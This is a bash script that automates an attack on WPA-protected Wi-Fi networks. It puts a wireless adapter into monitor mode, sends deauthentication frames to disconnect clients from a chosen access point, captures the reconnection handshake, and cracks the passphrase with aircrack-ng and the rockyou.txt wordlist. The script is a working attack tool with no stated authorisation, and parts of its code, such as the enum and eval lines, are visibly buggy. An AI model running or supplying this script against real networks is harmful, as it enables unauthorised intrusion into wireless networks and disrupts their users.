#!/bin/bash

function \
	_enum()
{
	local list=("$@")
	local len=${#list[@]}
	for (( i=0; i < $len; i++ )); do
		eval "$list[i]=$i"
	done
}

ENUM=(
	OK
	ERROR_1
	ERROR_2
	ERROR_3
	ERROR_3
)  && _enum "${ENUM[@]}"
state=OK

sudo rm -rf wpacap-01*
read -p "Please enter your wireless adapter interface name (use iwconfig):" wlan

if [[ $state -eq $OK ]] 
then 
	sudo rfkill list all && sudo ifconfig $wlan down && sudo iwconfig $wlan mode monitor && sudo ifconfig $wlan up && state=0 || state=1
fi

if [[ $state -eq $OK ]] 
then
	sudo timeout 12s airodump-ng $wlan && state=2 || state=0
fi

if [[ $state -eq $OK ]] 
then
	read -p "Please choose a WPA encrypted network bssid/mac from above:" NetMac
	read -p "please specify channel of network:" c
	sudo iwconfig $wlan channel $c && state=0 || state=3
fi

if [[ $state -eq $OK ]] 
then
	sudo aireplay-ng --deauth 25 -a $NetMac $wlan &
	sudo sudo timeout 20s airodump-ng --bssid $NetMac --channel $c $wlan --write wpacap &
	wait
fi

if [[ $state -eq $OK ]] 
then
	sudo aircrack-ng wpacap-01.cap -w rockyou.txt && state=0 || state=4
fi

sudo rm -rf wpacap-01*

if [[ $state -eq $OK ]] 
then
	echo "script finished with no errors"
else
	echo "script finished with error code: " $state 
fi
